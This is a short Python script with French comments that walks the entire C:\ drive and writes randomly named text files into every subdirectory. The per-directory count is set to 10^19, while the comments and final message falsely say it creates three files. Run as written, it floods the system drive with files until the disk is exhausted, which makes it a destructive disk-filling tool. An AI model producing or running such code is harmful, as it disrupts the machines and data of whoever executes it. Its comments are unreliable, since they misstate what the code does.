import os
import random
import string

def generate_random_string(length=8):
    """Génère une chaîne de caractères aléatoire."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def create_text_file(directory):
    """Crée un fichier texte avec un nom aléatoire dans le répertoire donné."""
    file_name = os.path.join(directory, f"file_{generate_random_string()}.txt")
    with open(file_name, 'w') as file:
        file.write(f"Contenu du fichier {file_name}")

def create_files_recursively(root_directory, num_files_per_directory=1):
    """Crée des fichiers texte de manière récursive dans tous les répertoires."""
    for root, dirs, files in os.walk(root_directory):
        for directory in dirs:
            for _ in range(num_files_per_directory):
                create_text_file(os.path.join(root, directory))


if __name__ == "__main__":
# Spécifiez le répertoire racine où vous souhaitez commencer la création des fichiers
    root_directory = 'C:\\'

# Crée trois fichiers texte de manière récursive dans tous les répertoires
    create_files_recursively(root_directory, num_files_per_directory=10000000000000000000)

    print(f"Trois fichiers texte ont été créés dans tous les répertoires de {root_directory}.")


